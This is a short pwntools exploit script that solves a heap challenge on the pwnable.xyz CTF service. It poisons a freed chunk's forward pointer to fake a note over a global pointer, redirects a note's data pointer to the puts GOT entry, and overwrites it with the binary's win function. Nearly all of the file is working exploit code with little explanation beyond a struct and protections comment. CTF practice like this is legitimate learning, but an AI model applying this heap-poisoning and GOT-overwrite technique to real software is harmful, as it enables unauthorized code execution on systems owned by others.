from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
# p = process('./challenge')
p = remote('svc.pwnable.xyz',30046)
libc = e.libc
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)
CurrentNote = 0x00000000006022A0
FirstNote = 0x00000000006022C0
NoteCount = 0x0000000000602310
win = e.symbols['win']

# Struct
'''
	| prev_size | size(0x71) |
	|  content  |  content   |
	| prev_size | size(0x61) |
	| 			|			 |
	| next_cont | 			 |
	|	.....	|	 .....	 |
	|  note_cnt |  next_note |

struct Note
{
  char Title[16];
  char *Data;
  char Remark[40];
  int Index;
  Note *Next;
};


Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
'''


def create(number):
	sla('>','1')
	sla(':',str(number))

def select(idx):
	sla('>','2')
	sla(':',str(idx))

def edit(content):
	sla('>','3')
	sla(':',content)

def delete():
	sla('>','4')

def quit():
	sla('>','5')

# fake chunk size 0x71 -> CurrentNote

create(0x71)
select(0x71)
delete()
select(0x71)
edit(p64(CurrentNote-8)) # fd -> CurrentNote-8 Next Allocate? -> CurrentNote
create(2)
select(0x72)
edit(p64(0)*5+p64(e.got['puts']))
select(0)
edit(p64(win))

p.interactive()